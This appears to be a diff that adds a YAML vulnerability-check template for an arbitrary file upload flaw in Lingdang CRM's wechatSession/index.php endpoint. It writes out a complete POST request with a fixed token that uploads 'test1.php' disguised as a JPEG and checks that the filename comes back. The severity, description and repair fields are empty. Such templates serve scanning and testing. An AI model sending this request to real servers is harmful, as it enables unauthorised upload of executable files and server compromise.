@@ -1,0 +1,28 @@
+id:
+info:
+  name: 灵当CRM wechatSession_index.php 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+    Connection: keep-alive
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy
+  data: |
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+    Content-Disposition: form-data; name="file"; filename="test1.php"
+    Content-Type: image/jpeg
+  
+    123456
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--
+response1:
+  body: test1.php
+  code: 200
+requests2:
+response2:
